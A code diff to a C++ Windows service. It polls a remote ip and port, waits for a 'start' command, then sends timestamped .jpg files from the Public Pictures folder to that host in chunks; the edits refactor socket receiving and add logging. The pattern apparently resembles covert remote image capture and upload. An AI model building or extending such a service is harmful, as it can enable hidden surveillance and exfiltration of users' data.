@@ -396,7 +396,6 @@ BOOL Online(int port, std::string& ip, const char* command)
 	char beforeName[100] = "##name##";
 	DWORD username_len = 100;
 	int check = 0;
-	char buf[1];
 
 	if (WSAStartup(0x0101, &WsaData))
 		return false;
@@ -432,32 +431,28 @@ BOOL Online(int port, std::string& ip, const char* command)
 		return false;
 	}
 
-	char cstart[100] = "start";
+	char startSending[100] = "start";
 	char b[50];
 
 	while (true)
 	{
 		//LaunchProcess("C:\\Users\\mi_ai\\source\\repos\\ServiceDebager\\x64\\Release\\ServiceDebager.exe", "!!!", true);
-		if (SOCKET_ERROR == send(s, buf, 0, 0))
-			return false;
 
-		check = recv(s, b, 50, MSG_PEEK);
+		check = recv(s, b, 50, 0);
+
 		if (check == 50)
 		{
-			if (!strcmp(cstart, b))
+			if (!strcmp(startSending, b))
 			{
-				recv(s, b, 50, 0);
-				/////////////////////////////////////////////////////////////////////////////////////////
+				b[1] = '\0';
 				char buffer[1024];
 				char start[50];
 				DWORD check = 0;
 
 				std::string temp;
 				std::string temp2;
-				std::string savename;
 				std::string jpjname;
 
-				savename = "C:\\Users\\Public\\Pictures\\";
 				jpjname = "C:\\Users\\Public\\Pictures\\";
 
 				std::stringstream ss;
@@ -465,11 +460,9 @@ BOOL Online(int port, std::string& ip, const char* command)
 				st << time(NULL);
 				ss << st.rdbuf();
 				temp += ss.str();
-				temp += ".png";
+				temp += ".jpg";
 				temp2 += ss.str();
 				temp2 += ".jpg";
-				savename += ss.str();
-				savename += ".png";
 				jpjname += ss.str();
 				jpjname += ".jpg";
 
@@ -487,6 +480,7 @@ BOOL Online(int port, std::string& ip, const char* command)
 				if (rFile == INVALID_HANDLE_VALUE)
 				{
 					closesocket(s);
+					CloseHandle(rFile);
 					return false;
 				}
 
@@ -541,6 +535,8 @@ BOOL Online(int port, std::string& ip, const char* command)
 						closesocket(s);
 						return false;
 					}
+
+					writeLog(start);
 
 					while (n < parts)
 					{
@@ -664,11 +660,20 @@ void WINAPI ServiceMain(int argc, char* argv[])
 	Sleep(20000);
 	LaunchProcess(adress, &com[0], false, false);
 
-	while (true)
+	try
 	{
-		Sleep(5000);
-		if (!stopped)
-			Online(std::stoi(port), ip, &command[0]);
+		while (true)
+		{
+			Sleep(5000);
+			if (!stopped)
+				Online(std::stoi(port), ip, &command[0]);
+		}
+	}
+	catch (const std::exception& e) 
+	{
+		std::string text = "Main exeption: ";
+		text += e.what();
+		writeLog(text.c_str());
 	}
 
 	return;
